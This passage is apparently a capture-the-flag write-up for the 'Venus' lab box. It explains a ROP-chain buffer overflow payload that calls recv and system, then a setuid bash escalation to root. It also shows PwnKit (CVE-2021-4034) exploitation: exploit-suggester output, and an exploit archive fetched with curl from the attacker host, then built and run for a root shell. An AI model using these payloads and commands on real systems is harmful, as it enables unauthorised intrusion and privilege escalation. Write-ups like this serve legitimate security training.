In this payload, we are setting up a chain of instructions to call the `recv` function to read a command into the binary's memory, and then calling `system` with that command.

1. Initial Padding

```python
payload += 0x418 * b'A'
```

- `0x418 * b'A'` adds padding to overflow the buffer up to the return address. This value (0x418) should match the exact offset to reach the return address based on the binary's layout.

2. First Gadget: `pop rdi; ret`

```python
payload += p64(pop_rdi)
payload += p64(fd)
```

- `p64(pop_rdi)` adds the address of the `pop rdi; ret` gadget. `p64` converts the address to a 64-bit little-endian format.
- `p64(fd)` adds the file descriptor (usually `0` for standard input) into the `rdi` register, which is the first argument for `recv`.

3. Second Gadget: `pop rsi; ret`

```python
payload += p64(pop_rsi)
payload += p64(binary.bss())
```

- `p64(pop_rsi)` adds the address of the `pop rsi; ret` gadget.
- `p64(binary.bss())` adds the address of the `.bss` section (a writable section of memory in the binary) into the `rsi` register, which is the second argument for `recv`. This is where the data will be written.

4. Third Gadget: `pop rdx; pop rcx; pop rbx; ret`

```python
payload += p64(pop_rdx_rcx_rbx)
payload += p64(len(command))
payload += p64(0)
payload += p64(0)
```

- `p64(pop_rdx_rcx_rbx)` adds the address of the `pop rdx; pop rcx; pop rbx; ret` gadget.
- `p64(len(command))` sets the length of the command to read into the `rdx` register, which is the third argument for `recv`.
- `p64(0)` sets the value of the `rcx` register (though it's not used here).
- `p64(0)` sets the value of the `rbx` register (though it's not used here).

5. Call `recv`

```python
payload += p64(binary.plt.recv)
```

- This adds the address of the `recv` function in the Procedure Linkage Table (PLT) to the payload. When this is executed, it will call `recv(fd, binary.bss(), len(command))`.

6. Second `pop rdi; ret` Gadget

```python
payload += p64(pop_rdi)
payload += p64(binary.bss())
```

- `p64(pop_rdi)` adds the address of the `pop rdi; ret` gadget again.
- `p64(binary.bss())` places the address of the `.bss` section into `rdi`, which now contains the received command string.

7. Call `system`

```python
payload += p64(libc.sym.system)
```

- This adds the address of the `system` function from the libc library to the payload. When this is executed, it will call `system(binary.bss())`, effectively running the command stored in the `.bss` section.

**TLDR;**

```python
payload  = b''
payload += 0x418 * b'A'                # Padding to overflow buffer and reach return address
payload += p64(pop_rdi)                # Address of `pop rdi; ret`
payload += p64(fd)                     # File descriptor (first argument for `recv`)
payload += p64(pop_rsi)                # Address of `pop rsi; ret`
payload += p64(binary.bss())           # Address of `.bss` section (second argument for `recv`)
payload += p64(pop_rdx_rcx_rbx)        # Address of `pop rdx; pop rcx; pop rbx; ret`
payload += p64(len(command))           # Length of the command (third argument for `recv`)
payload += p64(0)                      # Dummy value for `rcx`
payload += p64(0)                      # Dummy value for `rbx`
payload += p64(binary.plt.recv)        # Address of `recv` function
payload += p64(pop_rdi)                # Address of `pop rdi; ret`
payload += p64(binary.bss())           # Address of `.bss` section (first argument for `system`)
payload += p64(libc.sym.system)        # Address of `system` function
```

### Exploit

```bash
└─$ py bof.py REMOTE
[+] Opening connection to localhost on port 9080: Done
Message sent to the Venus space station.
Enter message:
[*] Closed connection to localhost port 9080
```

```bash
└─$ ssh -L 9080:127.0.0.1:9080 magellan@10.0.2.19
magellan@10.0.2.19s password:
Last login: Sun Jul 21 22:25:20 2024 from 10.0.2.15
[magellan@venus ~]$ ls -l /bin/bash
-rwsr-xr-x. 1 root root 1390080 Jan 26  2021 /bin/bash
[magellan@venus ~]$ /bin/bash -p
bash-5.1# cd /root
bash-5.1# ls
anaconda-ks.cfg  root_flag.txt
```

#### Root.txt

```
bash-5.1# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Congratulations on completing Venus!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_83588a17919eba10e20aad15081346af]
```

## CVE-2021-4034 (root)

Linpeas also returned few CVEs for the box, but because of `Exposure: less probable` I scrolled through them.

```bash
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
```

```bash
-bash-5.1$ find / -perm -4000 2>/dev/null
...
/usr/bin/pkexec
...
/usr/lib/polkit-1/polkit-agent-helper-1
...
-bash-5.1$ rpm -qi polkit
Name        : polkit
Version     : 0.117
Release     : 3.fc34
Architecture: x86_64
Install Date: Wed 19 May 2021 05:32:37 PM BST
Group       : Unspecified
Size        : 450073
License     : LGPLv2+
Signature   : RSA/SHA256, Fri 29 Jan 2021 04:28:31 AM GMT, Key ID 1161ae6945719a39
Source RPM  : polkit-0.117-3.fc34.src.rpm
Build Date  : Thu 28 Jan 2021 04:13:41 AM GMT
Build Host  : buildhw-x86-14.iad2.fedoraproject.org
Packager    : Fedora Project
Vendor      : Fedora Project
URL         : http://www.freedesktop.org/wiki/Software/polkit
Bug URL     : https://bugz.fedoraproject.org/polkit
Summary     : An authorization framework
Description :
polkit is a toolkit for defining and handling authorizations.  It is
used for allowing unprivileged processes to speak to privileged
processes.
-bash-5.1$ pkexec --version
pkexec version 0.117
```

polkit with suid bit is vulnerable to [CVE-2021-4034](https://github.com/berdav/CVE-2021-4034) on the box.

```bash
└─$ curl -LOs https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip
---
-bash-5.1$ curl 10.0.2.15/main.zip -Os && unzip -q main.zip && cd CVE-2021-4034-main && make && ./cve-2021-4034

cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.

sh-5.1# id
uid=0(root) gid=0(root) groups=0(root),1001(magellan) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```